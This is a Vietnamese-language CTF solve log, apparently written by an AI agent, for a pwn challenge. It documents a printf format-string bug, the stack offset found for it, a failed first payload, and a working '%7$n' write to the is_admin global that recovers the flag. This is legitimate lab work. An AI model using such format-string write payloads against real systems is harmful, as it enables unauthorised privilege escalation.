# notes.md - manifest-destiny

Target: `nc pwn.h7tex.com 42506` (port theo phiên; phiên đầu `41903` đã chết).
Artifact: `files/manifest.zip` -> `manifest` (sha256 `db581eff3b92bc55...`), libc 2.39, ld.
Cờ dạng `H7CTF{...}`.

## H0 - Triage binary
cmd: `node ~/.qoder/skills/ctf-solve/scripts/triage.cjs manifest`
evidence: `type=ET_EXEC (no PIE)`, `NX on`, `RELRO=yes`, dynamically linked, keyword `admin`.
  Imports: `printf, puts, fgets, read, atoi, fopen, fclose, memset, setvbuf` - không có `system/exec`
result: OK - hướng định vị: format string ghi vào biến quyền, không phải ROP

## H1 - Đọc disasm ba hàm
cmd: `objdump -d -M intel manifest | sed -n '/<feedback>:/,/^$/p'` (tương tự main, view_manifest)
evidence:
  - `feedback`: `sub rsp,0xd0` rồi `read(0, rbp-0xd0, 0xc7)` rồi `printf(rbp-0xd0)`
    => **buf == rsp tại thời điểm call printf**, và read 199 < 208 nên không overflow tuyến tính
  - `view_manifest`: `mov eax,[rip+..] # 40407c <is_admin>; test eax,eax; jne ...` rồi fopen+printf
  - quy đổi tham số: rdi=format, nên vararg#1..5 = rsi,rdx,rcx,r8,r9; vararg#6 = [rsp+8] = buf+0
result: OK - `buf+0` là `%6$`, `buf+8` là `%7$`, `is_admin` = `0x40407c`

## H2 - Server im lặng 0 byte
cmd: connect `pwn.h7tex.com:41903`, recv 6 s
evidence: `attempt 0: got 0 bytes`, `attempt 1: got 0 bytes`
result: DEAD - đó là phiên cũ đã hết hạn, không phải lỗi khai thác. Đề có cảnh báo "service có thể
  cần vài giây để khởi động". Chuyển sang port mới `42506` thì có menu ngay.

## H3 - Kiểm chứng vị trí buffer bằng leak
cmd: `1` rồi `MARKER-%6$p-%7$p-%8$p-%9$p-%10$p-%11$p-%12$p-%13$p`
evidence: `%6$p` -> `0x252d52454b52414d` = 8 byte `"MARKER-%"` little-endian
  => dự đoán offset đúng, buf+0 == đối số 6
result: OK

## H4 - Payload đầu tiên: `%7$n` đặt ở đầu buffer
cmd: `b"%7$n" + b"AA" + p64(0x40407c)`
evidence: không crash, echo `You said: AAAA|@@`, nhưng `2` vẫn báo
  `[!] admin clearance required.`
result: DEAD - hai lỗi cùng lúc: (a) `%n` ghi **số ký tự đã in**, mà `%n` đứng đầu nên ghi 0;
  (b) padding 2 byte làm địa chỉ nằm ở buf+6, lệch khỏi slot `%7$`

## H5 - Sửa: 4 ký tự in trước, `%7$n` sau, địa chỉ đúng buf+8
cmd: `b"CCCC%7$n" + p64(0x40407c)` (tổng 16 byte, có assert độ dài)
evidence: `2` trả `[manifest] clearance code: H7CTF{a2b24085-c670-4a87-93cb-293cfec6196c}`
result: OK - CỜ: `H7CTF{a2b24085-c670-4a87-93cb-293cfec6196c}`

## H6 - Xác nhận bản đóng gói
cmd: `python exploit.py pwn.h7tex.com 42506`
evidence: script in `[+] FLAG: H7CTF{a2b24085-...}` và ghi `flag.txt`
result: OK - exploit đã verify trên chính instance còn sống, không phải chỉ qua snippet tạm

## Ghi chú môi trường
- Không chạy được ELF Linux trên máy này (MinGW gdb chỉ debug PE, không có WSL/Docker),
  nên toàn bộ là **tĩnh (objdump/readelf) + động qua socket**. Không cần chạy local.
- Không cài pwntools: dùng `socket` + `struct` thuần (theo `references/environment.md`).
- Port instance đổi theo phiên -> exploit nhận host/port từ argv.
